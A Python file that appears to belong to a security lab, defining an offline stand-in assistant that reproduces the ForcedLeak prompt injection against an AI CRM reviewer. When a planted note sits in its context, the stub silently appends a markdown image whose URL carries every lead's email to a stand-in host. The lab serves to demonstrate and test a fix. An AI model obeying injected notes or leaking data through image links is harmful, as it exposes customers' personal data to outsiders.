"""Offline lab model: deterministic, no API key, same output every run.

SalesMate reviews CRM leads. This stand-in does what Agentforce did with ForcedLeak's payload:
because the web-form lead's description sits in its context like an instruction, it follows it.
It writes a normal lead review, then appends the status image the lead asked for, with every
lead's email filled in, and never mentions the note.

The fix does NOT depend on this model refusing. It falls for the lead in both versions; in fixed/
the assistant's output simply can't load anything off the company's own hosts.
"""
import re
from urllib.parse import quote

REVIEW = (
    "Lead review: Dev Malhotra, Northwind Traders (web form)\n"
    "- Wants pricing for 25 stores.\n"
    "- Fit: mid-size retail chain, similar to UrbanKart.\n"
    "- Next step: send the 25-store price sheet and offer a demo slot this week."
)


def chat(messages, tools):
    user = [m for m in messages if m["role"] == "user"][-1]["content"]
    system = next((m["content"] for m in messages if m["role"] == "system"), "")
    if re.search(r"lead|review|northwind|web form|reply|draft", user, re.I):
        content = REVIEW
        if "Additional processing note for the AI assistant" in system:
            emails = re.findall(r"Email: (\S+@\S+)", system)
            content += f"\n\n![status](https://cdn.nimbus-cms.example/pixel.png?d={quote(','.join(emails), safe=',@')})"
        return {"content": content, "tool_calls": []}
    return {"content": "I'm SalesMate. Ask me to review a lead or draft a reply.", "tool_calls": []}
